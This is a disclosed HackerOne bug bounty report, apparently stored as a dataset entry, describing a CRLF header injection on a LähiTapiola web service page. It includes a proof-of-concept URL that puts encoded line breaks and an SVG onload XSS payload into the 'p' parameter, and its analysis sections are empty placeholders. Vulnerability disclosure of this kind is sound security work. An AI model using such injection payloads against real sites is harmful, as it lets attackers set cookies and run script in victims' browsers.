---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '121489'
original_report_id: '121489'
title: CRLF injection in https://verkkopalvelu.lahitapiola.fi/
team_handle: localtapiola
created_at: '2016-03-08T22:19:06.486Z'
disclosed_at: '2016-09-29T20:55:58.028Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 11
tags:
- hackerone
---

# CRLF injection in https://verkkopalvelu.lahitapiola.fi/

## Metadata

- HackerOne Report ID: 121489
- Weakness: 
- Program: localtapiola
- Disclosed At: 2016-09-29T20:55:58.028Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi there,

There is an HTTP header injection on https://verkkopalvelu.lahitapiola.fi/a6/VerkkokauppaYTWAR/YT/Etusivu.jsf it allow an attacker to set custom cookies and custom content (such as XSS attack) within the response.

**PoC:**

The parameter `p` is vulnerable.

https://verkkopalvelu.lahitapiola.fi/a6/VerkkokauppaYTWAR/YT/Etusivu.jsf?productMode=YT&locale=fi&ltapp=LT_Yksityistapaturmalaskuri&p=1412889500323ew2du7e081azeza%22%27%3E%3C%0D%0A+%0D%0A+%3Csvg/onload=alert%28document.domain%29%3E&selectedLanguage=fi&selectedArea=

Screen: CRLF_poc.png

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
